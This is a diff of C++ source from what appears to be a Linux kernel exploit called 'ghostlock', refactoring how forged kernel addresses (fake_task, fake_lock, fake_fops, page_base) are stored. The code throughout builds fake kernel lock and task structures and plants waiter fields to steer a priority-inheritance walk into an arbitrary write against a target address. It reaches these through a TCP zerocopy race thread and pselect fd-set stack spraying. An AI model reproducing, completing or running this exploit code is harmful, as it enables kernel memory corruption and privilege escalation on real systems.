@@ -248,7 +248,7 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
     if (!ghostlock::encode_multicast_waiter(
             {reinterpret_cast<std::byte *>(stamp), stamp_size},
             layout.waiter_offset, layout.task_offset, layout.lock_offset,
-            fake_task, fake_lock)) {
+            (g_heap_context.current.fake_task), (g_heap_context.current.fake_lock))) {
         status.step = 59;
         status.error_number = EOVERFLOW;
         status.userspace_clean = 1;
@@ -396,9 +396,9 @@ static void *tcp_punch_thread(void *arg) {
 /* Acquire every userspace resource owned by the TCP route. No PI consumer or
  * punch operation is armed until this function has completed successfully. */
 int ghostlock::TcpZerocopyRoute::prepare() noexcept {
-    if (!page_base || !fake_lock || !fake_fops) {
+    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
         pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
-                page_base, fake_lock, fake_fops);
+                (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
         return fail(40, 0);
     }
 
@@ -450,7 +450,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
 
     pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
             "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
-            page_base, fake_lock, fake_w0, fake_task, waiter_task,
+            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task), waiter_task,
             attempts, arm_seq, post_hold);
 
     atomic_store(&punch_go, 1);
@@ -488,7 +488,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
                         mapping.data()) + page_size));
         put32(zc, 0x20, sizeof(sendbuf));
         put64(zc, 0x28, waiter_task);
-        put64(zc, 0x30, fake_lock);
+        put64(zc, 0x30, (g_heap_context.current.fake_lock));
 
         socklen_t len = sizeof(zc);
         errno = 0;
@@ -711,14 +711,14 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
          * the write value, children the write target; waiter->task is the
          * payload fake_task (planted fields for the PI walk). */
         struct pselect_waiter_word words[] = {
-                {2, fake_right, "tree_pc"},
+                {2, (g_heap_context.current.fake_right), "tree_pc"},
                 {3, 0, "tree_right"},
                 {4, request->target, "tree_left"},
-                {5, fake_right, "pi_pc"},
+                {5, (g_heap_context.current.fake_right), "pi_pc"},
                 {6, 0, "pi_right"},
                 {7, request->target, "pi_left"},
-                {8, fake_task, "task"},
-                {9, fake_lock, "lock"},
+                {8, (g_heap_context.current.fake_task), "task"},
+                {9, (g_heap_context.current.fake_lock), "lock"},
                 {10, ((uint64_t) FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
@@ -741,8 +741,8 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
                 {9, 0, "pi_left"},
                 {10, 1, "pi_prio"},
                 {11, 0, "pi_deadline"},
-                {12, fake_task, "task"},
-                {13, fake_lock, "lock"},
+                {12, (g_heap_context.current.fake_task), "task"},
+                {13, (g_heap_context.current.fake_lock), "lock"},
                 {14, 3, "wake_state"},
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
@@ -754,9 +754,9 @@ static void select_stack_build_fdsets(SelectStackRouteContext *context) {
 }
 
 int ghostlock::SelectStackRoute::prepare() noexcept {
-    if (!page_base || !fake_lock || !fake_fops) {
+    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
         pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
-                   "fops=%016zx\n", page_base, fake_lock, fake_fops);
+                   "fops=%016zx\n", (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
         return fail(30, 0);
     }
     int fds[2];
@@ -786,7 +786,7 @@ int ghostlock::SelectStackRoute::prepare() noexcept {
             "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
             "ex1=%016llx ex2=%016llx ex3=%016llx\n",
             pselect_waiter_shift(this),
-            page_base, fake_lock, fake_w0, fake_task,
+            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task),
             (unsigned long long) fdset_get_word(input_set.raw(), 0),
             (unsigned long long) fdset_get_word(input_set.raw(), 3),
             (unsigned long long) fdset_get_word(output_set.raw(), 0),
